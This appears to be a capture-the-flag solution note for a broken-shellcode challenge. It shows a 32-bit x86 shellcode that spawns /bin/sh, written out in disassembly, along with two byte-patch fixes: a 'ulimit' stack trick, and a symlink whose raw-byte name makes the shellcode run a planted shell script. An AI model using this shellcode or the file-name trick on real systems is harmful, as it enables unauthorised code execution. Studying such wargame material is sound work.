###original
#  the poblem is stack grows up and overlaps with code
#  thus need to move esp to somewhere else before the fourth push
'''
   0:   31 c0                   xor    eax,eax
   2:   50                      push   eax
   3:   68 2f 2f 73 68          push   0x68732f2f
   8:   68 2f 62 69 6e          push   0x6e69622f
   d:   89 e3                   mov    ebx,esp
   f:   50                      push   eax
  10:   53                      push   ebx
  11:   89 e1                   mov    ecx,esp
  13:   b0 0b                   mov    al,0xb
  15:   cd 80                   int    0x80
'''

###sol1
#  15 0x5c
#  $ulimit -a unlimited (allow stack to grow unlimitedly)
#  the new code looks like this
'''
   0:   31 c0                   xor    eax,eax
   2:   50                      push   eax
   3:   68 2f 2f 73 68          push   0x68732f2f
   8:   68 2f 62 69 6e          push   0x6e69622f
   d:   89 e3                   mov    ebx,esp
   f:   5c                      pop    esp
  10:   53                      push   ebx
  11:   89 e1                   mov    ecx,esp
  13:   b0 0b                   mov    al,0xb
  15:   cd 80                   int    0x80
'''
#  after pop esp, esp will be 0x6e69622f, but it won't crash since stack is allowed to grow

###intended solution
#  15 0xc9
#  $ ln -s /tmp/fix8/a.sh `perl -e 'print"\x83\xc4\x10\x83\xec\x0c\x50\xe8\x4d\x61\x01"'`
#  the new code looks like this
'''
   0:   31 c0                   xor    eax,eax
   2:   50                      push   eax
   3:   68 2f 2f 73 68          push   0x68732f2f
   8:   68 2f 62 69 6e          push   0x6e69622f
   d:   89 e3                   mov    ebx,esp
   f:   c9                      leave
  10:   53                      push   ebx
  11:   89 e1                   mov    ecx,esp
  13:   b0 0b                   mov    al,0xb
  15:   cd 80                   int    0x80
'''
#  leave moves esp to ebp+4, this results in ecx having additional entries
#  the code will try to open and execute script at [ecx+4], so create a file that matches name, and put shellscript inside
